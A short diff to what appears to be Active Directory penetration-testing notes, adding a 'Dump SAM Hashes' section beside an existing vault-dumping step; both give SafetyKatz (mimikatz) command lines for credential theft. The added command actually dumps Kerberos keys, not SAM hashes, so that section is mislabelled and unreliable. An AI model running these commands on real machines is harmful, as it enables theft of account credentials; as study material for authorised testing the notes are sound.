@@ -88,3 +88,11 @@ Dump credentials vault with SafetyKatz.exe.
 ```
 C:\AD\Tools\SafetyKatz.exe "token::elevate" "vault::cred /patch" "exit"
 ```
+
+## Dump SAM Hashes
+
+Dump SAM of local machine via mimikatz.exe
+
+```
+SafetyKatz.exe "sekurlsa::ekeys" "exit"
+```
